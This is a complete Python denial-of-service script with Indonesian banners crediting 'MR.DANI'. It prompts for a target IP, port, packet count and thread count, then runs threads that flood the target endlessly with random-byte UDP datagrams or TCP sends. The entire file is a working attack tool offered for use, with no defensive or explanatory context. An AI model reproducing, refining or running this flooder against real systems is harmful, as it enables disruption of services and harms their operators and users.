#!/usr/bin/env python3
#Code by MR.DANI
import random
import socket
import threading

print("~~~ DDOS TOOLS BY MR.DANI KHUSUS TEAM DANI ~~~")
print("~~~ Scripting By MR.DANI ~~~")
print("~~~ Script ini dibuat hanya untuk TEAM DANI. ~~~")
ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" siap untuk ddos(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" TOK TOK TOK PAKET DARI MR.DANI")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TOK TOK TOK PAKET DARI MR.DANI")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
